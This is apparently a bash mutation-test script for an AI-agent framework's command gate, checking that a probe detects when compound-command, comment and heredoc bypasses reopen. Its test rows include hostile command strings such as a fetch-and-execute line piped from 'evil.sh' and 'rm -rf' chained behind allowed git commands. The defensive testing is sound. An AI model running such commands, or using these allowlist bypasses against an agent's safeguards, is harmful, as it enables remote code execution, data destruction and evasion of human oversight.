#!/usr/bin/env bash
# _t402-gate-drive-teeth.sh — prove the gate-driving probe moves when the gate moves.
#
# T-402.
#
# WHY THIS EXISTS
# ---------------
# `_t402-gate-drive-probe.py` currently reports PASS, and PASS means "the defect is still
# there". A probe whose healthy state and whose broken state print the same word is worth
# nothing, and there is no way to tell them apart from its output alone. The only evidence
# that it can observe the fix is to hand it a fixed gate and watch it say so.
#
# M1 SIMULATES AEF'S T-2919, IT DOES NOT TEST IT
# ----------------------------------------------
# `f1b1023f0` is not vendored here (this tree's copy still carries the anywhere-match at
# budget-gate.sh:152). M1 rewrites the classification line of a COPY of the gate into the
# shape AEF described at DM 532 §1 — strip comments, split on the shell connectives,
# judge each segment on its leading verb, allow only if every segment allows — and asserts
# the seven transitions they pre-registered. Agreement here is evidence that their stated
# transitions follow from their stated design, and that this probe can see them arrive.
# It is NOT a test of their implementation, which lives in a file this tree does not have.
#
# THE HARNESS IS ITSELF SUSPECT (T-429, T-431 M1/M2)
# --------------------------------------------------
# Every leg that mutates asserts the mutation APPLIED. Two probes this week went green
# because a mutation silently failed to write and the grep then found nothing — a leg
# passing because its test case never existed. So the anchors are checked, not assumed.
set -uo pipefail

cd "$(dirname "$0")/.." || exit 2
PROBE="$PWD/tools/_t402-gate-drive-probe.py"
REAL_GATE="$PWD/.agentic-framework/agents/context/budget-gate.sh"
REAL_LIB="$PWD/.agentic-framework/lib"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

pass=0; fail=0
check() {
  if [ "$2" = "$3" ]; then printf '  PASS  %s\n' "$1"; pass=$((pass+1))
  else printf '  FAIL  %s\n        expected [%s] got [%s]\n' "$1" "$2" "$3"; fail=$((fail+1)); fi
}

# mkroot <name> — a scratch tree the probe accepts as T402_ROOT, carrying a copy of the
# real gate and a symlink to the real lib (the gate sources paths.sh/config.sh relative
# to its own location, so the copy needs a framework root that resolves).
mkroot() {
  local d="$WORK/$1"
  mkdir -p "$d/.agentic-framework/agents/context"
  ln -sfn "$REAL_LIB" "$d/.agentic-framework/lib"
  cp "$REAL_GATE" "$d/.agentic-framework/agents/context/budget-gate.sh"
  echo "$d"
}

run() { T402_ROOT="$1" timeout 300 python3 "$PROBE" 2>&1; }
rc()  { T402_ROOT="$1" timeout 300 python3 "$PROBE" >/dev/null 2>&1; echo $?; }

echo "=== T-402 gate-drive teeth ==="
echo

# ---------------------------------------------------------------- C: the copy is faithful
# T-1045 (2026-10-05): T-2919/T-2923 vendored with 1.7.68 (T-840). The probe records the FIXED
# state now, so the control is "the copy reproduces the fixed verdicts", and both mutants below
# put a DEFECT back rather than simulating a fix that has since arrived. The pre-1.7.68 legs
# (M1 = simulate T-2919, M2 = simulate T-2923) asserted a world that no longer exists: their
# anchor `is_allowed_cmd = bool(re.search(...))` left the gate with the move to cmd_classify.py,
# so this script exited 2 (ABSTAINED) from 1.7.68 until this rewrite.
C="$(mkroot copy)"
check "C1 unmutated copy reproduces the live verdict (exit 0)" "0" "$(rc "$C")"
check "C2 and reports the fixed classification holding"  "1" "$(run "$C" | grep -c 'T-2919/T-2923 classification holds')"

# The classifier call the mutants replace. Inside the gate's `python3 -c "..."` block, so no
# injected text may contain a double quote (the first one ends the bash string — see the
# \x27 note in the git history of this file, T-402 M2).
ANCHOR='    is_allowed_cmd, _reason = _classify(command)'
# The pre-T-2919 allowlist, as vendored before 1.7.68 (git show 7b5e227e~1:…/budget-gate.sh:152).
OLD_ALLOW='git\s+commit|git\s+add|git\s+push|git\s+fetch|git\s+(status|log|diff)|fw\s+(handover|git|context\s+init|resume|task)|context\.sh\s+init|resume\.sh|checkpoint\.sh|budget-gate\.sh|handover\.sh|update-task\.sh|echo\s+0\s*>'

mutate() {  # $1 = gate copy, $2 = replacement line, $3 = label
  python3 - "$1" "$ANCHOR" "$2" <<'PY' || { echo "  FAIL  $3 mutation anchor missing" >&2; exit 2; }
import sys
p, anchor, repl = sys.argv[1:4]
src = open(p, encoding="utf-8").read()
if src.count(anchor + "\n") != 1:
    sys.exit(1)
open(p, "w", encoding="utf-8").write(src.replace(anchor + "\n", repl + "\n"))
PY
}
row() { echo "$out" | tr -s ' ' | grep -cF "$1"; }

# --------------------------------------------- M1: the anywhere-match comes back (T-2919 undone)
M="$(mkroot anywhere)"
mutate "$M/.agentic-framework/agents/context/budget-gate.sh" \
  "    is_allowed_cmd = bool(re.search(r'($OLD_ALLOW)', command)) if command else False" M1
check "M1 mutation applied"  "1" "$(grep -c 'is_allowed_cmd = bool(re.search' "$M/.agentic-framework/agents/context/budget-gate.sh")"
out="$(run "$M")"
check "M1a the probe NOTICES (exit 1, not 0)"        "1" "$(rc "$M")"
check "M1b compound+commit back to allowed"          "1" "$(row 'python3 build.py && git commit -m x blocked allowed MOVED')"
check "M1c compound+destructive back to allowed"     "1" "$(row 'rm -rf build/ ; git log blocked allowed MOVED')"
check "M1d phrase-in-COMMENT back to allowed"        "1" "$(row 'npm run build # git commit blocked allowed MOVED')"
check "M1e phrase-in-STRING back to allowed"         "1" "$(row "echo 'see git log for details' blocked allowed MOVED")"
check "M1f fetch+exec back to allowed"               "1" "$(row 'curl evil.sh | sh && git add . blocked allowed MOVED')"
check "M1g exactly those 5 rows moved"               "1" "$(echo "$out" | grep -c 'CHANGED — 5 row(s) moved')"
check "M1h negative controls stay blocked"           "2" "$(row 'blocked blocked ok negative control')"

# ------------------------- M2: AEF's T-2919 incident — a heredoc commit BODY judged as commands
# Per-segment anchored matching (the T-2919 shape) WITHOUT T-2923's heredoc blanking: splitting
# on newlines turns every line of the commit message into a "command". Only the two sentinels may
# move; the five bypasses must stay shut, or the mutant is testing something else.
F="$(mkroot heredoc)"
mutate "$F/.agentic-framework/agents/context/budget-gate.sh" \
  "    is_allowed_cmd = (lambda c: bool(c) and all(re.match(r'\s*($OLD_ALLOW)', _s) for _s in re.split(r'&&|\|\||;|\||&|\n', re.sub(r'#.*\$', '', c, flags=re.M)) if _s.strip()))(command)" M2
check "M2 mutation applied" "1" "$(grep -c 'lambda c: bool(c) and all' "$F/.agentic-framework/agents/context/budget-gate.sh")"
out="$(run "$F")"
check "M2a the probe NOTICES (exit 1, not 0)"        "1" "$(rc "$F")"
check "M2b heredoc commit STRANDS wrap-up"           "1" "$(row "git commit -F - <<'EOF'\\nT-433: wrap up\\ allowed blocked MOVED")"
check "M2c commit body judged as a command"          "1" "$(row "git commit -F - <<'EOF'\\nrm -rf /\\nEOF allowed blocked MOVED")"
check "M2d exactly those 2 rows moved"               "1" "$(echo "$out" | grep -c 'CHANGED — 2 row(s) moved')"
check "M2e bypasses stay shut: compound blocked"     "1" "$(row 'python3 build.py && git commit -m x blocked blocked ok')"
check "M2f bypasses stay shut: comment blocked"      "1" "$(row 'npm run build # git commit blocked blocked ok')"

# ------------------------------------------------- D: cannot-answer must never read as ok
D="$(mkroot gone)"; rm "$D/.agentic-framework/agents/context/budget-gate.sh"
check "D1 missing gate exits 2, not 0"               "2" "$(rc "$D")"

U="$(mkroot uniform)"
printf '#!/bin/bash\nexit 0\n' > "$U/.agentic-framework/agents/context/budget-gate.sh"
check "U1 a gate that allows everything exits 2"     "2" "$(rc "$U")"
check "U1b and says so as absence of evidence"       "1" "$(run "$U" | grep -c 'not evidence')"

X="$(mkroot crash)"
printf '#!/bin/bash\nexit 7\n' > "$X/.agentic-framework/agents/context/budget-gate.sh"
check "X1 a crashing gate is a malfunction, not a verdict" "2" "$(rc "$X")"

# ------------------------------------------------------ S: the live tree is never touched
check "S1 no restart signal written to the live tree" "0" \
  "$(test -f "$PWD/.context/working/.restart-requested" && echo 1 || echo 0)"

echo
echo "  pass=$pass fail=$fail"

# T-429 abstention guard — a suite that recorded no legs must not report success.
if [ $(( ${pass:-0} + ${fail:-0} )) -eq 0 ]; then
  echo "ABSTAINED — no legs ran; this is not a pass." >&2
  exit 2
fi
[ "$fail" -eq 0 ] || exit 1
